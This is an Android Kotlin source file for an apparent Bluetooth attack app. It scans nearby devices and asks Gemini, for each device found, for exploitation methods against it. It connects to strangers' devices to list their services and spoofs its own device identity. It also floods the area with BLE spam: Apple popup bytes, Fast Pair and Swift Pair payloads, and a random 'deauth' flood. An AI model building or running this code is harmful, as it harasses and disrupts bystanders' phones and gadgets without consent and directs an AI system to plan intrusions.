package com.example.rabit.ui.network

import android.annotation.SuppressLint
import android.app.Application
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanResult
import android.content.Context
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.rabit.data.gemini.GeminiRepositoryImpl
import com.example.rabit.domain.model.gemini.GeminiRequest
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch

data class ShadowDevice(
    val name: String,
    val address: String,
    val rssi: Int,
    val type: String = "Unknown",
    val status: String = "Scanning",
    val vulnerability: String? = null
)

class BluetoothShadowViewModel(application: Application) : AndroidViewModel(application) {
    private val bluetoothManager = application.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
    private val bluetoothAdapter: BluetoothAdapter? = bluetoothManager.adapter

    private val _discoveredDevices = MutableStateFlow<List<ShadowDevice>>(emptyList())
    val discoveredDevices = _discoveredDevices.asStateFlow()

    private val _isShadowScanning = MutableStateFlow(false)
    val isShadowScanning = _isShadowScanning.asStateFlow()

    private val _shadowLog = MutableStateFlow<List<String>>(emptyList())
    val shadowLog = _shadowLog.asStateFlow()

    private val geminiRepo = GeminiRepositoryImpl()
    private val prefs = application.getSharedPreferences("rabit_prefs", Context.MODE_PRIVATE)

    @SuppressLint("MissingPermission")
    fun startShadowScan() {
        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled) {
            addLog("SYSTEM: Bluetooth Adapter is unavailable or disabled.")
            return
        }

        _isShadowScanning.value = true
        _discoveredDevices.value = emptyList()
        addLog("SHADOW: Initiating high-frequency stealth scan...")

        val scanner = bluetoothAdapter.bluetoothLeScanner
        scanner?.startScan(scanCallback)
        
        // Auto-stop after 30 seconds to save power/stealth
        viewModelScope.launch {
            delay(30000)
            stopShadowScan()
        }
    }

    @SuppressLint("MissingPermission")
    fun stopShadowScan() {
        bluetoothAdapter?.bluetoothLeScanner?.stopScan(scanCallback)
        _isShadowScanning.value = false
        addLog("SHADOW: Scan sequence terminated.")
    }

    private val scanCallback = object : ScanCallback() {
        @SuppressLint("MissingPermission")
        override fun onScanResult(callbackType: Int, result: ScanResult) {
            val device = result.device
            val name = device.name ?: "Hidden_Device"
            val address = device.address

            if (!_discoveredDevices.value.any { it.address == address }) {
                val newDevice = ShadowDevice(name, address, result.rssi)
                _discoveredDevices.value = _discoveredDevices.value + newDevice
                addLog("DETECTED: $name ($address) @ ${result.rssi}dBm")
                
                // Fingerprint with AI every time a new device is found
                fingerprintDevice(newDevice)
            }
        }
    }

    private fun fingerprintDevice(device: ShadowDevice) {
        val apiKey = prefs.getString("gemini_api_key", "") ?: ""
        if (apiKey.isBlank()) return

        viewModelScope.launch {
            val prompt = """
                You are a Bluetooth SIGINT Expert. 
                Target Device Detected:
                Name: ${device.name}
                Address: ${device.address} (OUI Fingerprinting)
                
                Identify the likely hardware type (e.g., Apple Watch, Sony Headphones, IoT Lightbulb).
                Suggest 3 unauthenticated "Silent Link" exploitation methods or GATT vulnerabilities for this device.
                Keep it tactical and brief.
            """.trimIndent()

            try {
                val response = geminiRepo.sendPrompt(GeminiRequest(prompt), apiKey)
                val updatedList = _discoveredDevices.value.map {
                    if (it.address == device.address) it.copy(vulnerability = response.text, status = "Fingerprinted")
                    else it
                }
                _discoveredDevices.value = updatedList
                addLog("NEURAL: Vulnerability analysis complete for ${device.address}")
            } catch (e: Exception) {
                // Ignore AI failures for stealth
            }
        }
    }

    fun addLog(msg: String) {
        _shadowLog.value = (listOf("> $msg") + _shadowLog.value).take(100)
    }

    private var activeGatt: android.bluetooth.BluetoothGatt? = null

    @SuppressLint("MissingPermission")
    fun initiateShadowLink(device: ShadowDevice) {
        val bluetoothDevice = bluetoothAdapter?.getRemoteDevice(device.address) ?: return
        
        addLog("LINK: Attempting stealth GATT handshake with ${device.address}...")
        
        activeGatt = bluetoothDevice.connectGatt(getApplication(), false, object : android.bluetooth.BluetoothGattCallback() {
            override fun onConnectionStateChange(gatt: android.bluetooth.BluetoothGatt, status: Int, newState: Int) {
                if (newState == android.bluetooth.BluetoothProfile.STATE_CONNECTED) {
                    addLog("SUCCESS: Shadow Link established with ${device.address}")
                    addLog("PROBE: Initiating deep service discovery...")
                    gatt.discoverServices()
                    
                    val updatedList = _discoveredDevices.value.map {
                        if (it.address == device.address) it.copy(status = "Shadow_Link_Active")
                        else it
                    }
                    _discoveredDevices.value = updatedList
                } else if (newState == android.bluetooth.BluetoothProfile.STATE_DISCONNECTED) {
                    addLog("WARN: Shadow Link severed for ${device.address}")
                }
            }

            override fun onServicesDiscovered(gatt: android.bluetooth.BluetoothGatt, status: Int) {
                if (status == android.bluetooth.BluetoothGatt.GATT_SUCCESS) {
                    addLog("DATA: Found ${gatt.services.size} tactical services.")
                    gatt.services.forEach { service ->
                        val serviceName = when (service.uuid.toString().uppercase().take(8)) {
                            "0000180A" -> "Device Information"
                            "0000180F" -> "Battery Service"
                            "00001805" -> "Current Time Service"
                            "D0611000" -> "Apple Continuity"
                            "9FA480E0" -> "Apple AirDrop"
                            else -> "Encrypted_Service_${service.uuid.toString().take(4)}"
                        }
                        addLog("IDENTIFIED: $serviceName [${service.uuid.toString().take(8)}...]")
                        
                        service.characteristics.forEach { char ->
                            addLog("CHAR_DETECT: ${char.uuid.toString().take(8)} | Prop: ${char.properties}")
                        }
                    }
                    addLog("FINISH: Deep-dive complete. Monitoring background pulses.")
                }
            }
        })
    }

    private val _isGhosting = MutableStateFlow(false)
    val isGhosting = _isGhosting.asStateFlow()

    private val _activeIdentity = MutableStateFlow("Original_Hardware")
    val activeIdentity = _activeIdentity.asStateFlow()

    private var advertiser: android.bluetooth.le.BluetoothLeAdvertiser? = null
    private var advertiseCallback: android.bluetooth.le.AdvertiseCallback? = null

    @SuppressLint("MissingPermission")
    fun toggleGhostMode(identity: String) {
        if (_isGhosting.value) {
            stopGhosting()
            return
        }

        val adapter = bluetoothAdapter ?: return
        if (!adapter.isMultipleAdvertisementSupported) {
            addLog("ERROR: Device hardware does not support Identity Spoofing.")
            return
        }

        _activeIdentity.value = identity
        _isGhosting.value = true
        addLog("GHOST: Masking identity as '$identity'...")

        advertiser = adapter.bluetoothLeAdvertiser
        val settings = android.bluetooth.le.AdvertiseSettings.Builder()
            .setAdvertiseMode(android.bluetooth.le.AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setConnectable(true)
            .setTimeout(0)
            .build()

        val data = android.bluetooth.le.AdvertiseData.Builder()
            .setIncludeDeviceName(true)
            .build()

        // Temporarily change local adapter name for the advertisement
        val oldName = adapter.name
        adapter.name = identity

        advertiseCallback = object : android.bluetooth.le.AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: android.bluetooth.le.AdvertiseSettings?) {
                addLog("SUCCESS: Ghost Identity broadcast active.")
            }
            override fun onStartFailure(errorCode: Int) {
                addLog("ERROR: Ghosting failed (Code: $errorCode)")
                _isGhosting.value = false
                adapter.name = oldName
            }
        }

        advertiser?.startAdvertising(settings, data, advertiseCallback)
    }

    private val _isSpamming = MutableStateFlow(false)
    val isSpamming = _isSpamming.asStateFlow()

    private val _spamProfile = MutableStateFlow("Apple_Popup_Flood")
    val spamProfile = _spamProfile.asStateFlow()

    @SuppressLint("MissingPermission")
    fun toggleBleSpam(profile: String) {
        if (_isSpamming.value) {
            stopSpamming()
            return
        }

        val adapter = bluetoothAdapter ?: return
        if (!adapter.isMultipleAdvertisementSupported) {
            addLog("ERROR: Device hardware does not support BLE Spamming.")
            return
        }

        _spamProfile.value = profile
        _isSpamming.value = true
        addLog("DISRUPT: Initiating $profile sequence...")

        advertiser = adapter.bluetoothLeAdvertiser
        
        viewModelScope.launch {
            while (_isSpamming.value) {
                val data = buildSpamData(profile)
                val settings = android.bluetooth.le.AdvertiseSettings.Builder()
                    .setAdvertiseMode(android.bluetooth.le.AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                    .setConnectable(true)
                    .build()

                val callback = object : android.bluetooth.le.AdvertiseCallback() {
                    override fun onStartSuccess(settingsInEffect: android.bluetooth.le.AdvertiseSettings?) {}
                }

                advertiser?.startAdvertising(settings, data, callback)
                delay(100) // High frequency rotation
                advertiser?.stopAdvertising(callback)
                delay(50)
            }
        }
    }

    private fun buildSpamData(profile: String): android.bluetooth.le.AdvertiseData {
        val builder = android.bluetooth.le.AdvertiseData.Builder()
        when (profile) {
            "Apple_Popup_Flood" -> {
                // Apple Continuity/Handoff Spam bytes
                builder.addManufacturerData(0x004c, byteArrayOf(0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa.toByte(), 0x30, 0x01, 0x00))
            }
            "Android_Fast_Pair" -> {
                // Google Fast Pair Spam
                builder.addServiceUuid(android.os.ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"))
                builder.addServiceData(android.os.ParcelUuid.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"), byteArrayOf(0x00, 0x00, 0x00))
            }
            "Windows_Swift_Pair" -> {
                // Microsoft Swift Pair
                builder.addManufacturerData(0x0006, byteArrayOf(0x03, 0x00, 0x80.toByte()))
            }
            "Spectre_Deauth" -> {
                // Aggressive random flood to disrupt GATT handshakes
                val randomBytes = ByteArray(10) { (0..255).random().toByte() }
                builder.addManufacturerData(0xFFFF.toInt(), randomBytes)
            }
        }
        return builder.build()
    }

    @SuppressLint("MissingPermission")
    fun stopSpamming() {
        _isSpamming.value = false
        addLog("DISRUPT: Spam sequence terminated.")
    }

    @SuppressLint("MissingPermission")
    fun stopGhosting() {
        advertiser?.stopAdvertising(advertiseCallback)
        _isGhosting.value = false
        addLog("GHOST: Identity mask removed. Reverting to original hardware ID.")
    }

    override fun onCleared() {
        super.onCleared()
        @SuppressLint("MissingPermission")
        activeGatt?.disconnect()
        activeGatt?.close()
        stopGhosting()
    }
}
